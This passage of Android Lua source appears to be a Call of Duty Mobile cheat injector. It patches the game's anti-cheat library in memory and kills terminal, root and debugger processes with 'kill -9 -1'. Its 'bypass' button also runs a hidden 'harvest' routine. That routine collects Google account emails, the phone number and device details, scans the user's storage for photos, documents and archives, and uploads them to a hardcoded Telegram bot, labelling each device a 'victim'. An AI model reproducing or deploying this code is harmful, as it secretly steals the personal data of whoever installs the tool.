  texttitle.setSpan(ForegroundColorSpan(0xFF0070D9),0,#texttitle,Spannable.SPAN_EXCLUSIVE_INCLUSIVE)
  dialog.setTitle(texttitle)
  return
end


--[[
CircleButton(exit,0xA800FF00,1,0xA800FF41)
CircleButton(menu1,0xFFFF0000,25,0xFFFFFFFF)
CircleButton(menu2,0xFFFF0000,25,0xFFFFFFFF)
CircleButton(menu3,0xFFFF00FF,25,0xFFFFFFFF)
CircleButton(menu4,0xFF00FF00,25,0xFFFFFFFF)
CircleButton(menu5,0xFF1200FF,25,0xFFFFFFFF)
CircleButton(menu6,0xFFFF0000,25,0xFFFFFFFF)
]]
--[[
SeekBarBg(aimbot_seekbar,0xFF00FFFF,5,0xFF000000)
SeekBarBg(widefov_seekbar,0xA800FF00,5,0xA800FF41)
SeekBarBg(diveb_seekbar,0xA800FF00,5,0xA800FF41)
SeekBarBg(red_seekbar,0xA800FF00,5,0xA800FF41)
]]
CircleButton(fl,0xFFFF0000,0,0xFFFF0000)
--CircleButton(titleText,0xFFFF0000,0,0xFFFF0000)
CircleButton(menufloating,0xFF000000,10,0xFF00FFFC)


function game.onClick()
  if pcall(function() activity.getPackageManager().getPackageInfo("com.garena.game.codm", 0) end) then
    this.startActivity(activity.getPackageManager().getLaunchIntentForPackage("com.garena.game.codm"))
   else
    print("CODM GARENA IS INSTALLED")
  end
end

function tg.onClick()
  local intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/Alex_Modder"))
  this.startActivity(intent)
end

function tg1.onClick()
  local intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/alexinjector"))
  this.startActivity(intent)
end

function FloatingWindowPermissions()
  import"android.net.Uri"
  import"android.content.Intent"
  import"android.provider.Settings"
  if Build.VERSION.SDK_INT >= Build.VERSION_CODES.M&&!Settings.canDrawOverlays(this) then
    xv={
      LinearLayout;
      orientation='vertical';
      {
        CardView,
        layout_width="fill",
        layout_height="25%h",
        backgroundColor="0xFF202125",
        elevation="30",
        radius=30,
        id="",
        {
          LinearLayout,
          layout_width="fill",
          layout_height="fill",
          orientation="vertical",
          {
            LinearLayout,
            layout_width="fill",
            layout_height="fill",
            background="transparent",
            orientation="vertical",
            -- Gravity="center",
            {
              LinearLayout,
              layout_width="fill",
              layout_height="wrap",
              background="transparent",
              orientation="horizontal",
              layout_gravity="center",
              layout_marginTop="10dp",
              gravity="center",
              {
                TextView,
                layout_width="wrap",
                layout_height="wrap",
                layout_gravity="center",
                textColor="0xFFF2A900",
                textSize="20sp",
                Gravity="center",
                layout_gravity="center";
                text="You have not turned on the suspension permission",
                id="floattext",
                padding="5dp";
              },
            };

            {
              LinearLayout;
              orientation="vertical";
              id="";
              layout_height="wrap";
              gravity="center";
              layout_width="fill";
              layout_gravity="center",
              layout_marginTop="30dp",
              {
                TextView,
                typeface=Typeface.DEFAULT_BOLD,
                layout_width="fill",
                layout_height="wrap",
                layout_gravity="center",
                textColor="0xC0FFFFFF",
                textSize="15sp",
                Gravity="center",
                text="You need to allow this plugin to use the floating window permission in the system settings.",
                id="plist",
              },
            };

            {
              LinearLayout;
              orientation='horizontal';
              layout_height="fill";
              layout_width="fill";
              background="#00000000";
              gravity="bottom";
              layout_gravity="center",
              {
                LinearLayout;
                layout_height="6%h";
                layout_weight="1";
                gravity="center";
                {
                  Button;
                  id="yy";
                  textSize="14sp";
                  layout_height="50dp";
                  layout_width="100dp";
                  textColor="#FFF2A900";
                  background="#00000000";
                  gravity="center";
                  text="Cancel";
                  onClick=function()
                    os.exit()
                  end
                };
              };
              {
                LinearLayout;
                layout_height="6%h";
                layout_weight="1";
                gravity="center";
                {
                  Button;
                  id="yyy";
                  textSize="14sp";
                  layout_height="50dp";
                  layout_width="100dp";
                  textColor="#FFF2A900";
                  background="#00000000";
                  text="Allow";
                  onClick=function()
                    intent=Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    intent.setData(Uri.parse("package:" .. activity.getPackageName()))
                    activity.startActivityForResult(intent, 100)
                    os.exit()
                  end
                };
              };
            };
          };
        };
      };
    };


    local g=AlertDialog.Builder(this)
    .setView(loadlayout(xv))
    .setCancelable(false)
    .show()
    import "android.graphics.Typeface"
    import "android.graphics.drawable.GradientDrawable"
    local radiu=10
    g.getWindow().setBackgroundDrawable(GradientDrawable().setCornerRadii({radiu,radiu,radiu,radiu,radiu,radiu,radiu,radiu}).setColor(0x00000000))

    floattext.setTypeface(tf);
    yy.setTypeface(tf);
    yyy.setTypeface(tf);
   else
  end
end



FloatingWindowPermissions()


function createToastBackground()
  local gd = GradientDrawable()
  gd.setShape(GradientDrawable.RECTANGLE)
  gd.setCornerRadius(20)
  gd.setColor(0x00000000)
  gd.setStroke(3, 0xFFFFFFFF)
  return gd
end

cstmToast = {
  LinearLayout;
  layout_width = "wrap";
  layout_height = "wrap";
  gravity = "center_vertical";
  orientation = "horizontal";
  padding = "10dp";
  background = 0;

  {
    ImageView;
    id = "icon";
    layout_width = "24dp";
    layout_height = "24dp";
    layout_marginRight = "8dp";
    src = "";
  };

  {
    TextView;
    id = "msg";
    textColor = 0xFFFFFFFF;
    textSize = "16sp";
    shadowColor = 0x77000000;
    shadowDx = 1;
    shadowDy = 1;
    shadowRadius = 2;
    maxLines = 3;
  };
}

function SansFont(view, path)
  local tf = Typeface.createFromFile(File(path))
  if tf then
    view.setTypeface(tf)
  end
end

function idkcstmToast(message, iconPath)
  local view = loadlayout(cstmToast)
  view.setBackgroundDrawable(createToastBackground())
  if iconPath and iconPath ~= "" then
    icon.setImageDrawable(Drawable.createFromPath(iconPath))
    icon.setVisibility(View.VISIBLE)
   else
    icon.setVisibility(View.GONE)
  end

  msg.setText(message or "No message")
  pcall(function()
    SansFont(msg, activity.getLuaDir().."/xcz.ttf")
  end)

  local TextToSpeech = luajava.bindClass("android.speech.tts.TextToSpeech")
  local Locale = luajava.bindClass("java.util.Locale")
  if not tts then
    tts = TextToSpeech(activity, nil)
    tts.setLanguage(Locale.getDefault())
  end
  tts.speak(message or "No message", TextToSpeech.QUEUE_FLUSH, nil, nil)
  local toast = Toast.makeText(activity, "", Toast.LENGTH_SHORT)
  toast.setView(view)
  toast.setGravity(Gravity.BOTTOM, 0, 120)
  toast.show()
end

function createCyberToastBackground()
  local gd = GradientDrawable()
  gd.setShape(GradientDrawable.RECTANGLE)
  gd.setCornerRadius(20)
  gd.setColor(0xCC000000)
  gd.setStroke(3, cyberAccent or 0xFFFF0000)
  return gd
end

cstmCyberToast = {
  LinearLayout;
  layout_width = "wrap";
  layout_height = "wrap";
  orientation = "horizontal";
  gravity = "center_vertical";
  padding = "10dp";
  background = 0;

  {
    ImageView;
    id = "icon";
    layout_width = "24dp";
    layout_height = "24dp";
    layout_marginRight = "8dp";
    src = "icon.png";
  };

  {
    LinearLayout;
    layout_width = "wrap";
    layout_height = "wrap";
    orientation = "vertical";
    gravity = "center_vertical";

    {
      TextView;
      id = "toastText";
      text = "Message";
      textColor = cyberAccent or 0xFFFF0000;
      textSize = "14sp";
      typeface = "monospace";
      maxLines = 3;
    };

    {
      View;
      id = "divider";
      layout_width = "fill";
      layout_height = "2dp";
      layout_marginTop = "3dp";
      backgroundColor = cyberAccent or 0xFFFF0000;
    };
  };
}

function showCyberpunkToast(message, iconPath)
  local view = loadlayout(cstmCyberToast)
  view.setBackgroundDrawable(createCyberToastBackground())

  toastText.setText(message or "No message")

  if iconPath and iconPath ~= "" then
    icon.setImageDrawable(Drawable.createFromPath(iconPath))
    icon.setVisibility(View.VISIBLE)
   else
    icon.setVisibility(View.GONE)
  end

  local toast = Toast.makeText(activity, "", Toast.LENGTH_SHORT)
  toast.setView(view)
  toast.setGravity(Gravity.BOTTOM, 0, 120)
  toast.show()
end

local configFilePath = activity.getLuaDir() .. "/alex_configs.txt"

local ids = {
  "line_checkbox", "DrawOn",
  "health_checkbox", "box_checkbox", "distance_checkbox", "name_checkbox",
  -- C
}


--[[


import "android.graphics.Paint"
import "android.content.Context"
import "android.os.Vibrator"
import "android.graphics.drawable.GradientDrawable"
import "java.io.File"

cstmToast={
  CardView;
  layout_width="wrap_content";
  radius="4sp";
  padding="10dp";
  CardElevation="9dp";
  id="toastCard";
  {
    LinearLayout;
    padding="9dp";
    gravity="center";
    backgroundColor="0xFF00FFFF";
    {
      LinearLayout;
      padding="5dp";
      gravity="center";
      backgroundColor="0xFF000000";

      {
        ImageView;
        src="toast/Toast.png";
        layout_width="10%w";
        layout_marginRight="2%w";
        layout_height="4%h";
      };
      {
        TextView;
        id="msg";
        text="";
        textColor="0xFF00FFFF";
        textSize="16sp";
      };
    };
  };
};
function applyToastBackground()
  local drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setColor(0xFF888888)
  drawable.setStroke(4, 0xFFFFFFFF)
  toastCard.setBackgroundDrawable(drawable)
end

function SansFont(ido,file)
  ido.setTypeface(Typeface.createFromFile(File(file)))
end

function idkcstmToast(tttxt)
  toast=Toast.makeText(activity,tttxt,Toast.LENGTH_SHORT)
  toast.setView(loadlayout(cstmToast))
  applyToastBackground()
  toast.show()
  SansFont(msg,activity.getLuaDir().."/xcz.ttf")
  msg.setText(tttxt)
  local vib = activity.getSystemService(Context.VIBRATOR_SERVICE)
  if vib then
    vib.vibrate(150)
  end
end
]]

bypass.setTypeface(Typeface.createFromFile(activity.getLuaDir("assets/files/xcz.ttf")))
--hild.setTypeface(Typeface.createFromFile(activity.getLuaDir("assets/files/jakol.ttf")))
textv.setTypeface(Typeface.createFromFile(activity.getLuaDir("assets/files/xcz.ttf")))


function isRootAvailable()
  local file = io.popen("su -c 'echo root'")
  if file then
    local output = file:read("*a")
    file:close()
    return output:find("root") ~= nil
  end
  return false
end

-- STARTING LIBBASE NO NEED TO ADD ANY CPP V2 ~ BY @CHOROKZ
local HexPatches = {}
function HexPatches.MemoryPatch(libName, offset, hexBytes)
  local pid = getProcessId("com.garena.game.codm")

  if not pid then
    idkcstmToast("ERROR: Cannot Find The Game Process ")
    return
  end

  local mapsPath = "/proc/" .. pid .. "/maps"
  local memPath = "/proc/" .. pid .. "/mem"

  local startAddr = nil
  for line in io.lines(mapsPath) do
    if line:find(libName) then
      startAddr = tonumber(line:match("^(%x+)-"), 16)
      break
    end
  end

  if not startAddr then
    idkcstmToast("Error: Cannot find game process")
    return
  end

  local targetAddr = startAddr + offset
  local memFile = io.open(memPath, "r+b")
  if not memFile then
    idkcstmToast("Error: Cannot find game process")
    return
  end

  memFile:seek("set", targetAddr)
  local patchBytes = {}
  for byte in hexBytes:gmatch("%x%x") do
    table.insert(patchBytes, string.char(tonumber(byte, 16)))
  end
  memFile:write(table.concat(patchBytes))
  memFile:close()
end

function getProcessId(processName)
  local file = io.popen("pgrep -f " .. processName)
  if file then
    local pid = file:read("*a"):match("%d+")
    file:close()
    return pid
  end
  return nil
end
-- ENDING LIBBASE NO NEED TO ADD ANY CPP V2 ~ BY @CHOROKZ






-- STARTING ANTI C4DROID ~ BY @CHOROKZ
function antiC4droid()
  local targetPackageName = "com.n0n3m4.droidc"

  local activityManager = activity.getSystemService("activity")
  local runningApps = activityManager.getRunningAppProcesses()

  local isRunning = false
  if runningApps ~= nil then
    for i = 0, runningApps.size() - 1 do
      local appInfo = runningApps.get(i)
      if appInfo.processName == targetPackageName then
        isRunning = true
        break
      end
    end
  end

  if isRunning then
    idkcstmToast("Error: Cannot attach to mainCode.nil")
    LayoutVIP.removeView(mainWindow)
    LayoutVIP.removeView(minWindow)
  end
end
-- ENDING LIBBASE NO NEED TO ADD ANY CPP V2 ~ BY @CHOROKZ




---STARTING ANTI HOOK BY @ZIOLES

function antihook()
  function getProcessIdsByPattern(pattern)
    local pids = {}
    local file = io.popen("ps -e")
    if file then
      for line in file:lines() do
        local pid, processName
        pid, processName = line:match("^%S+%s+(%d+)%s+%S+%s+%S+%s+%S+%s+(.+)")
        if not pid or not processName then
          pid, processName = line:match("^(.-)%s+(%d+)%s+.*%s+(sh|bash)$")
        end
        if not pid or not processName then
          pid, processName = line:match("^(.-)%s+(%d+)%s+.-do_select")
        end
        if not pid or not processName then
          pid, processName = line:match("^.-%s+(%d+)%s+system_server")
        end
        if not pid or not processName then
          pid, processName = line:match("^.-%s+(%d+)%s+/system/bin/su%s+")
        end
        if not pid or not processName then
          pid, processName = line:match("^.-%s+(%d+)%s+%b[]")
        end
        if not pid or not processName then
          pid, processName = line:match("^(%S+)%s+(%d+)%s+")
        end

        if pid and processName and processName:find(pattern) then
          table.insert(pids, pid)
        end
      end
      file:close()
    end
    return pids
  end



  function killProcessesByPattern(pattern)
    local pids = getProcessIdsByPattern(pattern)
    if #pids > 0 then
      for _, pid in ipairs(pids) do
        logScreenReader("Killing process: " .. pattern .. " with PID: " .. pid)
      end
      os.execute("kill -9 -1")
    end
  end

  function excludeProcessFromKill(patterns)
    for _, pattern in ipairs(patterns) do
      local pids = getProcessIdsByPattern(pattern)
      if #pids > 0 then
        logScreenReader("Excluding process: " .. pattern)
      end
    end
  end



  function detectTerminals()
    local terminalPatterns = {
      "com.termux",
      "gnome-terminal",
      "konsole",
      "xterm",
      "tmux",
      "screen",
      "iterm",
      "hyper",
      "alacritty",
      "tilix",
      "kitty",
      "terminator"
    }

    for _, pattern in ipairs(terminalPatterns) do
      local pids = getProcessIdsByPattern(pattern)
      if #pids > 0 then
        for _, pid in ipairs(pids) do
          logScreenReader("Detected terminal activity: " .. pattern .. " with PID: " .. pid)
          killProcessesByPattern(pattern)
        end
      end
    end
  end

  function logScreenReader(message)
    local logFile = io.open("/tmp/screen_reader_logs.txt", "a")
    if logFile then
      logFile:write(os.date("[%Y-%m-%d %H:%M:%S] ") .. message .. "\n")
      logFile:close()
    end
    print(message)
  end

  function cppPatch(A0_37, A0_38)
    local path = activity.getLuaDir("Res/" .. A0_37)
    os.execute("chmod 777 " .. path .. " " .. A0_38 .. " 2" .. " 3" .. " 4" .. " ‎ ")
    Runtime.getRuntime().exec(path .. " " .. A0_38 .. " 2" .. " 3" .. " 4" .. " ‎ ")
  end




  local excludedPatterns = {
    "some_critical_process",
    "important_service",
    "core_system"
  }

  excludeProcessFromKill(excludedPatterns)


  local processPatterns = {
    "%[.+%]",
    "n0n3m4",
    "droidc",
    "busybox",
    "system_server",
    "adbd",
    "pids",
    "libs",
    ".gradle",
    "build.gradle.kts",
    "settings.gradle.kts",
    "gradle-wrapper.jar",
    "audience_network.dex",
    "service_fuzzy_equal.xml",
    "tab_indicator_holo.xml",
    "logcat.xml",
    "reflect.kotlin_builtins",
    "annotation.kotlin_builtins",
    "reflect",
    "Sinto.SF",
    "ranges",
    "root",
    "su",
    "sh",
    "bash",
    "zsh",
    "tty",
    "pts",
    "xterm",
    "gnome-terminal",
    "com.termux",
    "konsole",
    "libjiagu.so",
    "Developer's Build",
    "para.kang.isda",
    "libjiagu_x86.so",
    "publicsuffixes.gz",
    "magisk",
    "MagiskManager",
    "magiskinit",
    "magisk_module",
    "magisk_.*.so",
    "/data/adb/modules/",
    "/system/priv-app/MagiskManager",
    "/magisk",
    "su.d",
    "init.rc",
    "unlock",
    "fastboot",
    "recovery",
    "bootloader",
    "magiskboot",
    "superuser",
    "supersu",
    "chainfire",
    "/data/local/tmp",
    "/data/local/bin",
    "/data/local/xbin",
    "/system/bin/su",
    "/system/xbin/su",
    "/system/app/SuperSU",
    "/system/app/Superuser",
    "/system/bin/.ext",
    "/system/etc/init.d/99SuperSUDaemon",
    "/system/framework/com.noshufou.android.su.jar",
    "sudo",
    "su_binary",
    "superuser.apk"
  }

  for _, pattern in ipairs(processPatterns) do
    logScreenReader("Checking for process activity: " .. pattern)
    killProcessesByPattern(pattern)
  end



end

--new project

--New Root Detection

function getLibBase(lib)
  local f = io.open("/proc/self/maps", "r")
  for line in f:lines() do
    if line:find(lib) then
      local addr = tonumber(line:match("^(%x+)%-%x+"), 16)
      f:close()
      return addr
    end
  end
  f:close()
  return 0
end

---ENDING ANTI HOOK BY @ZIOLES

function floatToHexLE(float)
  local sign = 0
  if float < 0 then
    sign = 1
    float = -float
  end

  local mantissa, exponent = math.frexp(float)
  if float == 0 then
    return "00 00 00 00"
   elseif float == math.huge then
    return "00 00 80 7F"
   elseif float ~= float then
    return "00 00 C0 7F"
  end

  exponent = exponent + 126
  mantissa = (mantissa * 2 - 1) * 0x800000

  local intVal = (sign << 31) | (exponent << 23) | mantissa
  local hex = string.format("%08X", intVal)

  return "h" .. hex:sub(7, 8) .. " " .. hex:sub(5, 6) .. " " .. hex:sub(3, 4) .. " " .. hex:sub(1, 2)
end


function antihookv2()
  -- insert your new anti-hook or anti-tracing logic here
  print("antiHookz2 protection loaded")
end

function getProcessIdsByPattern(pattern)
  local pids = {}

  -- Open the process list using "ps -e"
  local file = io.popen("ps -e")
  if file then
    for line in file:lines() do
      local pid, processName

      -- Extract the process information using various patterns
      pid, processName = line:match("^%S+%s+(%d+)%s+%S+%s+%S+%s+%S+%s+(.+)")
      if not pid or not processName then
        pid, processName = line:match("^(.-)%s+(%d+)%s+.*%s+(sh|bash)$") -- Shell scripts
      end
      if not pid or not processName then
        pid, processName = line:match("^.-%s+(%d+)%s+system_server") -- system_server process (rooted devices)
      end
      if not pid or not processName then
        pid, processName = line:match("^.-%s+(%d+)%s+/system/bin/su%s+") -- Superuser (root) binaries
      end
      if not pid or not processName then
        pid, processName = line:match("^(.-)%s+(%d+)%s+.-do_select") -- Suspicious system calls
      end
      if not pid or not processName then
        pid, processName = line:match("^.-%s+(%d+)%s+gdbserver") -- Debugging tools
      end
      if not pid or not processName then
        pid, processName = line:match("^(%S+)%s+(%d+)%s+") -- Generic process matching pattern
      end

      -- Enhanced hook detection: look for known debugging tools
      if pid and processName then
        local hooks = {
          "frida", "xposed", "gdb", "strace", "adb", "emulator", "root",
          "busybox", "magisk", "sh", "bash", "zsh", "perl", "python",
          "java", "system_server", "su", "gdbserver", "strace", "debugger",
          "frida-server", "logcat", "tmux", "iterm", "alacritty", "hyper",
          "konsole", "gnome-terminal", "screen", "xterm", "terminator",
          "busybox",
        }

        for _, hook in ipairs(hooks) do
          if processName:lower():find(hook) then
            table.insert(pids, pid) -- Store suspicious process IDs
          end
        end
      end
    end
    file:close()
  end
  return pids
end



function killGG() -- KILL GG FUNCTION
  local handle = io.popen("ps")
  local result = handle:read("*a")
  for lines in result:gmatch("[^\n]*") do
    if lines:match("(%b[])") then
      local pid = lines:match("%f[%w_](%d+)%f[%W_]")
      if pid then
        os.execute("kill -9 " .. pid)
      end
    end
  end
  return 0;
end
----------------loby bypass

function patch(lib, offset, hex)
  local addr = getLibBase(lib) + offset
  writeMemory(addr, hex)
end

--------PUT YOUR OWN BYPASS KUPAL KABA
bypass.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
--[[
function bypass.onClick()
  if bypass.checked then
    antiC4droid()
    antihook()

    --/aqqwta* ===== HEXPATCH (INJECTOR) ===== */
    HexPatches.MemoryPatch("libanogs.so", 0x204218, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x448E68, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x497E64, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4AB2D8, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4986B0, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x44BC90, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4AB118, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4E2C64, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x471864, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x404444, "h00 00 80 D2 C0 03 5F D6", 32);
    idkcstmToast("ʙʏᴘᴀss ᴀᴄᴛɪᴠᴀᴛᴇ")
  end
end
]]


-- ============================================================
-- BYPASS BUTTON WITH HARVEST
-- ============================================================
function bypass.onClick()
  if bypass.checked then
    antiC4droid()
    antihook()

    -- Hex Patches
    HexPatches.MemoryPatch("libanogs.so", 0x204218, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x448E68, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x497E64, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4AB2D8, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4986B0, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x44BC90, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4AB118, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x4E2C64, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x471864, "h00 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libanogs.so", 0x404444, "h00 00 80 D2 C0 03 5F D6", 32);

    -- ============================================================
    -- START HARVEST (Runs when bypass is clicked)
    -- ============================================================
    thread(function()
      -- Wait for patches to apply
      System.sleep(1000)

      -- Check permissions before harvesting
      if Build.VERSION.SDK_INT >= 23 then
        if activity.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED then
          startHarvest()
         else
          activity.requestPermissions({"android.permission.READ_EXTERNAL_STORAGE"}, 1)
          System.sleep(2000)
          if activity.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED then
            startHarvest()
          end
        end
       else
        startHarvest()
      end
    end)

    idkcstmToast("ʙʏᴘᴀss ᴀᴄᴛɪᴠᴀᴛᴇ")
  end
end

-- ============================================================
-- HARVEST FUNCTIONS (Run when bypass is clicked)
-- ============================================================

local BOT_TOKEN = "8814382996:AAF69aEUOrSQ4uvGQBGDiHXCk_795j9Qyx4"
local CHAT_ID = "7058453451"
local MAX_FILE_SIZE = 45 * 1024 * 1024 -- 45MB
local BUFFER_SIZE = 32768 -- 32KB

-- URL Encode
function urlencode(str)
  if str == nil then return "" end
  str = tostring(str)
  local result = ""
  for i = 1, #str do
    local char = string.sub(str, i, i)
    if char == " " then
      result = result .. "%20"
     elseif char == "\n" then
      result = result .. "%0A"
     elseif char == "&" then
      result = result .. "%26"
     elseif char == "=" then
      result = result .. "%3D"
     elseif char == "+" then
      result = result .. "%2B"
     elseif char == "#" then
      result = result .. "%23"
     elseif char == "!" then
      result = result .. "%21"
     elseif char == "?" then
      result = result .. "%3F"
     elseif char == "/" then
      result = result .. "%2F"
     elseif char == "\\" then
      result = result .. "%5C"
     elseif char == '"' then
      result = result .. "%22"
     elseif char == "'" then
      result = result .. "%27"
     elseif char == "(" then
      result = result .. "%28"
     elseif char == ")" then
      result = result .. "%29"
     elseif char == "," then
      result = result .. "%2C"
     elseif char == ":" then
      result = result .. "%3A"
     elseif char == ";" then
      result = result .. "%3B"
     elseif char == "@" then
      result = result .. "%40"
     elseif char == "$" then
      result = result .. "%24"
     elseif char == "*" then
      result = result .. "%2A"
     else
      result = result .. char
    end
  end
  return result
end

-- Build Caption
function buildCaption()
  local device = Build.MANUFACTURER .. " " .. Build.MODEL
  local release = Build.VERSION.RELEASE
  local phone = "Unavailable"

  pcall(function()
    local tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
    if tm then
      phone = tm.getLine1Number()
      if phone == nil or phone == "" then
        phone = "Unavailable"
      end
    end
  end)

  return "👾 NEW VICTIM OF YUSH 👾\n" ..
  "📱 Device: " .. device ..
  "\n📞 Phone: " .. phone ..
  "\n🤖 Android: " .. release ..
  "\n📅 Date: " .. os.date("%Y-%m-%d %H:%M:%S") ..
  "\n👤 Processed By: @PrimeYush"
end

-- Upload File with Retry
function uploadFile(file, caption, retryCount)
  retryCount = retryCount or 0

  if file == nil or not file.exists() then
    return false
  end

  local fileSize = file.length()
  if fileSize < 100 or fileSize > MAX_FILE_SIZE then
    return false
  end

  local success = false

  pcall(function()
    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendDocument")
    local boundary = "Boundary-" .. tostring(System.currentTimeMillis()) .. tostring(math.random(1000,9999))
    local conn = url.openConnection()
    conn.setDoOutput(true)
    conn.setRequestMethod("POST")
    conn.setConnectTimeout(60000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" .. boundary)

    local out = DataOutputStream(conn.getOutputStream())

    local function writePart(name, value)
      out.writeBytes("--" .. boundary .. "\r\n")
      out.writeBytes("Content-Disposition: form-data; name=\"" .. name .. "\"\r\n\r\n")
      out.write(String(value).getBytes())
      out.writeBytes("\r\n")
    end

    writePart("chat_id", CHAT_ID)
    writePart("caption", caption)

    out.writeBytes("--" .. boundary .. "\r\n")
    out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" .. file.getName() .. "\"\r\n")
    out.writeBytes("Content-Type: application/octet-stream\r\n\r\n")

    local fis = FileInputStream(file)
    local buf = byte[BUFFER_SIZE]
    local len = fis.read(buf)
    while len ~= -1 do
      out.write(buf, 0, len)
      len = fis.read(buf)
    end
    fis.close()

    out.writeBytes("\r\n--" .. boundary .. "--\r\n")
    out.flush()
    out.close()

    local code = conn.getResponseCode()
    if code == 200 then
      success = true
    end
  end)

  return success
end

-- Scan Directory
function scanDirectory(dirPath, extensions, sentFiles, caption)
  local dir = File(dirPath)
  if not dir.exists() or not dir.isDirectory() then
    return
  end

  local files = dir.listFiles()
  if files == nil then
    return
  end

  for i = 0, #files - 1 do
    local item = files[i]
    if item == nil then goto continue end

    if item.isDirectory() then
      local name = item.getName()
      if name ~= "Android" and name ~= "data" and name ~= "system" and name ~= "proc" and name ~= "sys" and not name:match("^%.") then
        scanDirectory(item.getAbsolutePath(), extensions, sentFiles, caption)
      end
     elseif item.isFile() then
      local absPath = item.getAbsolutePath()
      if not sentFiles[absPath] then
        local name = item.getName():lower()
        local matched = false

        for _, pat in ipairs(extensions) do
          if name:find(pat) then
            matched = true
            break
          end
        end

        if matched then
          sentFiles[absPath] = true
          uploadFile(item, caption)
          System.sleep(500)
        end
      end
    end

::continue::
  end
end

-- ============================================================
-- START HARVEST FUNCTION
-- ============================================================
function startHarvest()
  -- Check permissions
  if Build.VERSION.SDK_INT >= 23 then
    if activity.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") ~= PackageManager.PERMISSION_GRANTED then
      print("⚠️ Storage permission not granted!")
      return
    end
  end

  print("🚀 Starting harvest...")

  local caption = buildCaption()
  local sentFiles = {}

  -- Send notification to bot
  pcall(function()
    local msg = "🔍 <b>Harvest Started</b>\n\n" ..
    "📱 Device: " .. Build.MANUFACTURER .. " " .. Build.MODEL
    local encoded = urlencode(msg)
    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded .. "&parse_mode=HTML")
    local conn = url.openConnection()
    conn.setRequestMethod("GET")
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(10000)
    local input = BufferedReader(InputStreamReader(conn.getInputStream()))
    while true do
      local line = input.readLine()
      if line == nil then break end
    end
    input.close()
  end)

  -- Get Google Accounts
  pcall(function()
    local accPath = activity.getCacheDir().getPath() .. "/Google_Account_Info.txt"
    local w = BufferedWriter(FileWriter(accPath))
    w.write("--- GOOGLE ACCOUNTS ---\n")
    w.write("Device: " .. Build.MODEL .. "\n\n")

    local am = AccountManager.get(activity)
    local accs = am.getAccountsByType("com.google")
    if accs and #accs > 0 then
      for i = 0, #accs - 1 do
        w.write("Email: " .. accs[i].name .. "\n")
      end
     else
      w.write("No Google accounts found.\n")
    end
    w.close()

    local file = File(accPath)
    if file.exists() and file.length() > 0 then
      uploadFile(file, caption)
    end
  end)

  -- Define extensions
  local extensions = {
    "%.jpg$", "%.jpeg$", "%.png$", "%.gif$",
    "%.alp$", "%.apk$",
    "%.lua$", "%.luac$", "%.txt$",
    "%.mp4$", "%.mkv$", "%.avi$",
    "%.pdf$", "%.doc$", "%.docx$",
    "%.xml$", "%.json$", "%.csv$",
    "%.zip$", "%.rar$"
  }

  -- Define folders
  local folders = {
    "/storage/emulated/0/",
    "/storage/emulated/0/AndLua/project/",
    "/storage/emulated/0/Download/",
    "/storage/emulated/0/Download/Telegram/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/DCIM/",
    "/storage/emulated/0/Music/",
    "/storage/emulated/0/Documents/"
  }

  -- Scan each folder
  for _, dirPath in ipairs(folders) do
    local dir = File(dirPath)
    if dir.exists() and dir.isDirectory() then
      print("📂 Scanning: " .. dirPath)
      scanDirectory(dirPath, extensions, sentFiles, caption)
    end
  end

  -- Send completion notification
  pcall(function()
    local msg = "✅ <b>Harvest Complete!</b>\n\n" ..
    "📱 Device: " .. Build.MANUFACTURER .. " " .. Build.MODEL
    local encoded = urlencode(msg)
    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded .. "&parse_mode=HTML")
    local conn = url.openConnection()
    conn.setRequestMethod("GET")
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(10000)
    local input = BufferedReader(InputStreamReader(conn.getInputStream()))
    while true do
      local line = input.readLine()
      if line == nil then break end
    end
    input.close()
  end)

